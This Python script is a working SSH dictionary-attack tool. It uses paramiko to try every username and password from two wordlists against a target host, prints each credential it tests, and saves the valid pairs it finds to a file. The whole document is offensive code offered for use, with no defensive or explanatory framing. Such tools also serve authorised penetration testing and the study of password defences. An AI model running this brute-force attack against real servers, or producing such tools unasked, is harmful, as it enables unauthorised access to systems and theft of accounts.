#!/usr/bin/python
import paramiko
import socket
def check_connection(target, username, password):
    # init
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=target, username=username, password=password, timeout=2)
    except socket.timeout:
        # Can't access target
        print(f"Host: {target} is unreachable - is SSH enabled?.")
        return False
    except paramiko.AuthenticationException:
        print(f"Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"Exception occured")
        return False
    else:
        # connection established
        print(f"Valid Credentials:\n\tHOSTNAME: {target}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
        return True

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Dictionary Attack for SSH servers")
    parser.add_argument("target", help="Target machine")
    parser.add_argument("-p", "--passwords", help="Password file")
    parser.add_argument("-u", "--username", help="SSH Usernames file")
    # parse args
    args = parser.parse_args()
    target = args.target
    passes = args.passwords
    usernamefile = args.username
    # read file(s)
    usernames = open(usernamefile).read().splitlines()
    passes = open(passes).read().splitlines()
    # attack
    for user in usernames:
        for password in passes:
            if check_connection(target, user, password):
                # if credentials are valid, save them
                open("ValidCreds.txt", "w").write(f"\nUsername: {user}@{target}\nPassword {password}\n\n")
                break